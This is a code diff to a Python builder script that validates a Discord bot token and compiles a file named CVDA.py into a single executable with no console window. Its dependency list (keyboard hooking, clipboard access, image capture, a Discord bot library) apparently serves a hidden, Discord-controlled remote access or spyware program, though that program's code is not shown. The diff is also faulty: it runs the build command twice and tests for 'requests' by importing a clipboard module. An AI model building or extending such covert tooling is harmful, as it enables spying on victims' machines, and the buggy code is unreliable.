@@ -3,6 +3,8 @@ import subprocess
 import sys
 import ctypes
 from pathlib import Path
+import asyncio
+from CVDA import discord_token
 from uuid import UUID
 
 
@@ -74,6 +76,31 @@ def tryInstallPackages(packages):
 
 
 def compile():
+
+    import requests
+
+    
+    headers = {
+        "Authorization": f"Bot {discord_token}"
+    }
+
+    response = requests.get("https://discord.com/api/v10/users/@me", headers=headers)
+
+    if response.status_code == 200:
+        print("Valid token!")
+        print(response.json())
+    else:
+        print("Invalid token:", response.status_code, response.text)
+        quit()
+
+    try:
+        os.system("pyinstaller --onefile --noconsole CVDA.py")
+    except Exception as e:
+        print("PyInstaller failed.")
+        print(e)
+        return False
+
+
     try: 
         os.system("pyinstaller --onefile --noconsole CVDA.py")
     except Exception as e:
@@ -101,7 +128,7 @@ def compile():
 
 
 def findPackagesInstalled():
-    packages_to_install = ["pyinstaller", "nextcord", "pyperclip", "pynput", "pillow", "pywin32"]
+    packages_to_install = ["pyinstaller", "nextcord", "pyperclip", "pynput", "pillow", "pywin32", "requests"]
     try:
         import PyInstaller
         packages_to_install.remove("pyinstaller")
@@ -138,6 +165,13 @@ def findPackagesInstalled():
     except:
         print('Pywin32 not installed, requesting install.')
 
+    try:
+        import win32clipboard
+        packages_to_install.remove("requests")
+    except:
+        print('Requests not installed, requesting install.')
+
+
  
 
     if not packages_to_install:
@@ -164,4 +198,3 @@ if compileResult == True:
     print(" \n \n \n Completed Compiler... Application has started, check to see if your discord bot is currently online.")
 else:
     print("\n \n \n An error has occurred in the compiler.")
-
